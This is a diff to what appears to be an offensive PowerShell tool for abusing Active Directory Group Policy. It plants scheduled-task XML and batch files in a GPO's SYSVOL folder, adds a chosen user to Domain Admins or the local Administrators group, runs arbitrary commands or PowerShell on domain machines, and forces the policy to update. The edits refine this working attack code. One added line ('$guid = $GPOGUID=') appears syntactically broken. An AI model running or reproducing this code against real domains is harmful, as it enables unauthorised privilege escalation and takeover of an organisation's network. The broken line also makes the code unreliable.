@@ -125,8 +125,7 @@ if(!($LoadDLL)){
     $red+" Couldn't load DLL, exiting..."
     return
 }
-    $guid = $GPOGUID
-    $guid2 = "{"+$guid+"}"
+    $guid = $GPOGUID=
     
     # Use provided domain or get it from AD
     if ($Domain) {
@@ -189,7 +188,7 @@ if(!($LoadDLL)){
         Copy-Item $SecondTaskXMLPath "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml" -Force 2>&1>$null
         Copy-Item add.bat "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\add.bat" -Force 2>&1>$null
         $green+" Created wsadd.xml and add.bat files in SYSVOL!"
-        $pwd = (Get-Location | Select-Object -ExpandProperty Path)
+        $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
         $boundary = (Get-Date).AddHours(24).ToString("s")
         if($SecondXMLCMD){
             $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\wsadd.xml"
@@ -248,12 +247,12 @@ if(!($LoadDLL)){
     if($DA){
         if(!$User){
             $User = Read-Host "Supply user to elevate!"
-            if($User -eq $null){
+            if($null -eq $User){
                 return
         }
         }
         $dacommand = '/r net group "Domain Admins" '+$User+' /add /dom'
-        $pwd = (Get-Location | Select-Object -ExpandProperty Path)
+        $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -275,12 +274,12 @@ if(!($LoadDLL)){
     } elseif($Local){
         if(!$User){
             $User = Read-Host "Supply user to elevate!"
-            if($User -eq $null){
+            if($null -eq $User){
                 return
         }
         }
         $localcommand = '/r net localgroup Administrators '+$User+' /add'
-        $pwd = (Get-Location | Select-Object -ExpandProperty Path)
+        $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -301,7 +300,7 @@ if(!($LoadDLL)){
         $green+" ScheduledTasks file modified to add $User to local administrators group on $Computer!"
     } else {
         if($SecondTaskXMLPath){
-            $pwd = (Get-Location | Select-Object -ExpandProperty Path)
+            $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -327,7 +326,7 @@ if(!($LoadDLL)){
             } elseif(($PowerShell.StartsWith("-Command "))){
                 $PowerShell = $PowerShell.replace("-Command ","")
         }
-        $pwd = (Get-Location | Select-Object -ExpandProperty Path)
+        $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -355,7 +354,7 @@ if(!($LoadDLL)){
         } elseif(($CMD.StartsWith("/r "))){
             $CMD = $CMD.replace("/r ","")
         }
-        $pwd = (Get-Location | Select-Object -ExpandProperty Path)
+        $pwdd = (Get-Location | Select-Object -ExpandProperty Path)
         $xmlfile = "\\$domain\SYSVOL\$domain\Policies\$guid\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml"
         $encoding = 'ASCII'
         $xmlfilecontent = Get-Content -Encoding $encoding -Path $xmlfile
@@ -380,7 +379,6 @@ if(!($LoadDLL)){
     }
     }
     $Ext = "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
-    $GPO = "CN=$guid,CN=Policies,CN=System,$domaindn"
     $gray+" Incrementing GPT.INI Version by 1"
     $gptIniFilePath = "\\$domain\SYSVOL\$domain\Policies\$guid\GPT.INI"
     $encoding = 'ASCII'
@@ -439,21 +437,27 @@ if(!($LoadDLL)){
             }}
         $green+" User added to the local admins group!"
     }elseif($CMD -or $PowerShell){
+        $tempFile = "\\$Domain\SYSVOL\$Domain\Policies\$GPOGUID\Machine\Preferences\GPOwned_Executed.tmp"
         for ($x = 1; $x -le 300; $x+=10){
             $PercentCompleted = ($x/300*100)
-            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF! (Press `"End`" to quit)" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
             Start-Sleep -Seconds 10
-            if(($Host.UI.RawUI.ReadKey("IncludeKeyDown").VirtualKeyCode -eq 35)){
+            if (Test-Path $tempFile) {
+                Remove-Item $tempFile -Force
+                $green+" Command executed successfully!"
                 break
             }
         }
+        if ($x -gt 300) {
+            $red+" Timeout: Command execution could not be verified."
+        }
     }elseif($SecondTaskXMLPath){
         if(!$User){
-            $User = $env:USERNAME
+            $User = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[-1]
         }
         for ($x = 1; $x -le 86400; $x+=60){
             $PercentCompleted = ($x/86400*100)
-            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF! (Press `"End`" to quit)" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
+            Write-Progress -Activity "Waiting for GPO update on the DC... WAIT UNTIL COMPLETION, DO NOT TURN OFF!" -Status "$PercentCompleted% Complete:" -PercentComplete $PercentCompleted
             Start-Sleep -Seconds 10
             if ((Get-ADGroupMember "Domain Admins" | Where-Object {$_.SamAccountName -like "*$User*"})) {
                 break
